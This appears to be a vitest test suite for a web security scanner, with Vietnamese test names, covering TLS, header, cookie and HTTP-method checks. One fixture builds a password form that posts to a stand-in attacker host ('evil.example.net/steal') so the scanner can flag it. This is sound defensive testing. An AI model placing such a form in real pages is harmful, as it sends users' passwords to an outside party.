import { describe, expect, it } from "vitest";
import { baseline, failing, hdr, rec, run, setHtml } from "./fixtures";

describe("tls.hsts-preload", () => {
  const id = "tls.hsts-preload";
  it("baseline (có preload) → đạt", () => expect(run(baseline(), id)[0]!.status).toBe("pass"));
  it("HSTS tốt nhưng thiếu preload → Low, tin cậy thấp", () => {
    const o = baseline(); hdr(o)["strict-transport-security"] = "max-age=63072000; includeSubDomains";
    expect(failing(o, id)[0]).toMatchObject({ severity: "low", confidence: "low" });
  });
  it("preload nhưng thiếu includeSubDomains hoặc max-age ngắn → Low, tin cậy cao", () => {
    const o = baseline(); hdr(o)["strict-transport-security"] = "max-age=63072000; preload";
    expect(failing(o, id)[0]).toMatchObject({ severity: "low", confidence: "high" });
    hdr(o)["strict-transport-security"] = "max-age=20000000; includeSubDomains; preload";
    expect(failing(o, id)[0]).toMatchObject({ confidence: "high" }); // ≥ 6 tháng nhưng < 1 năm: preload vẫn bị từ chối
  });
  it("không có HSTS → im lặng (đã báo ở tls.hsts)", () => {
    const o = baseline(); delete hdr(o)["strict-transport-security"];
    expect(run(o, id)).toHaveLength(0);
  });
});

describe("tls.cipher-suite", () => {
  const id = "tls.cipher-suite";
  const withCipher = (protocol: string, cipher: string) => { const o = baseline(); Object.assign(o.https!.tls!, { protocol, cipher }); return o; };
  it("TLS 1.3 → đạt", () => expect(run(baseline(), id)[0]!.status).toBe("pass"));
  it("ECDHE + GCM trên TLS 1.2 → đạt", () => expect(run(withCipher("TLSv1.2", "ECDHE-RSA-AES128-GCM-SHA256"), id)[0]!.status).toBe("pass"));
  it("CBC có forward secrecy → Low; không forward secrecy → Medium; 3DES/RC4 → High", () => {
    expect(failing(withCipher("TLSv1.2", "ECDHE-RSA-AES128-SHA"), id)[0]).toMatchObject({ severity: "low" });
    expect(failing(withCipher("TLSv1.2", "AES128-GCM-SHA256"), id)[0]).toMatchObject({ severity: "medium" });
    expect(failing(withCipher("TLSv1.2", "ECDHE-RSA-DES-CBC3-SHA"), id)[0]).toMatchObject({ severity: "high" });
    expect(failing(withCipher("TLSv1.2", "RC4-SHA"), id)[0]).toMatchObject({ severity: "high" });
  });
  it("không có thông tin TLS → im lặng", () => {
    const o = baseline(); delete o.https!.tls;
    expect(run(o, id)).toHaveLength(0);
  });
});

describe("headers.cache-policy", () => {
  const id = "headers.cache-policy";
  it("có Cache-Control rõ ràng → đạt", () => expect(run(baseline(), id)[0]!.status).toBe("pass"));
  it("thiếu Cache-Control → Low, tin cậy thấp", () => {
    const o = baseline(); delete hdr(o)["cache-control"];
    expect(failing(o, id)[0]).toMatchObject({ severity: "low", confidence: "low" });
  });
  it("đặt cookie mà cho phép lưu đệm dùng chung → Medium", () => {
    const o = baseline();
    Object.assign(hdr(o), { "cache-control": "public, max-age=600", "set-cookie": "sid=1; Secure" });
    o.https!.chain = [{ url: o.https!.finalUrl, status: 200, headers: hdr(o) }];
    expect(failing(o, id)[0]).toMatchObject({ severity: "medium" });
  });
  it("private/no-store kèm cookie → đạt", () => {
    const o = baseline();
    Object.assign(hdr(o), { "cache-control": "private, no-store", "set-cookie": "sid=1; Secure" });
    o.https!.chain = [{ url: o.https!.finalUrl, status: 200, headers: hdr(o) }];
    expect(run(o, id)[0]!.status).toBe("pass");
  });
});

describe("config.debug-headers", () => {
  const id = "config.debug-headers";
  it("baseline → đạt", () => expect(run(baseline(), id)[0]!.status).toBe("pass"));
  it("X-Debug-Token → Medium; X-Runtime → Low", () => {
    const o = baseline(); Object.assign(hdr(o), { "x-debug-token": "abc123", "x-runtime": "0.0123" });
    const f = failing(o, id);
    expect(f.map((x) => x.severity).sort()).toEqual(["low", "medium"]);
  });
  it("IP nội bộ trong header bất kỳ → Low; IP công khai và Set-Cookie thì không", () => {
    const o = baseline(); Object.assign(hdr(o), { via: "1.1 10.2.3.4", "x-trace": "8.8.8.8", "set-cookie": "a=10.1.1.1" });
    const f = failing(o, id);
    expect(f).toHaveLength(1);
    expect(f[0]!.evidence[0]).toContain("via");
  });
});

describe("config.http-methods", () => {
  const id = "config.http-methods";
  it("không có dữ liệu OPTIONS (quét nhanh) → im lặng", () => { const o = baseline(); o.methods = null; expect(run(o, id)).toHaveLength(0); });
  it("GET/HEAD/OPTIONS → đạt", () => expect(run(baseline(), id)[0]!.status).toBe("pass"));
  it("TRACE → Medium; PUT/DELETE → Low tin cậy thấp", () => {
    const o = baseline(); o.methods = { status: 200, allow: "GET, HEAD, TRACE" };
    expect(failing(o, id)[0]).toMatchObject({ severity: "medium", confidence: "high" });
    o.methods = { status: 200, allow: "GET, PUT, DELETE" };
    expect(failing(o, id)[0]).toMatchObject({ severity: "low", confidence: "low" });
  });
});

describe("browser.form-targets", () => {
  const id = "browser.form-targets";
  it("không có form mật khẩu → im lặng", () => expect(run(baseline(), id)).toHaveLength(0));
  it("form mật khẩu cùng origin → đạt; sang origin khác → Medium", () => {
    const o = baseline(); setHtml(o, `<html><head><title>t</title></head><body><form method="post" action="/login"><input type="password"></form></body></html>`);
    expect(run(o, id)[0]!.status).toBe("pass");
    setHtml(o, `<html><head><title>t</title></head><body><form method="post" action="https://evil.example.net/steal"><input type="password"></form></body></html>`);
    expect(failing(o, id)[0]).toMatchObject({ severity: "medium", confidence: "high" });
  });
});

describe("cookies.prefix", () => {
  const id = "cookies.prefix";
  const withCookie = (c: string) => { const o = baseline(); o.https = rec({ headers: { ...hdr(o), "set-cookie": c }, chain: [{ url: "https://example.com/", status: 200, headers: { ...hdr(o), "set-cookie": c } }] }); o.page = o.https; return o; };
  it("không có cookie → im lặng", () => expect(run(baseline(), id)).toHaveLength(0));
  it("cookie phiên không có tiền tố → Low (tin cậy thấp); có __Host- → đạt; cookie không phải phiên → im lặng", () => {
    expect(failing(withCookie("session=abc; Path=/; Secure; HttpOnly"), id)[0]).toMatchObject({ severity: "low", confidence: "low" });
    expect(run(withCookie("__Host-session=abc; Path=/; Secure; HttpOnly"), id)[0]!.status).toBe("pass");
    expect(run(withCookie("theme=dark; Path=/"), id)).toHaveLength(0);
  });
  it("bằng chứng không bao giờ chứa giá trị cookie", () => {
    expect(JSON.stringify(failing(withCookie("session=SUPERSECRETVALUE; Path=/"), id))).not.toContain("SUPERSECRETVALUE");
  });
});
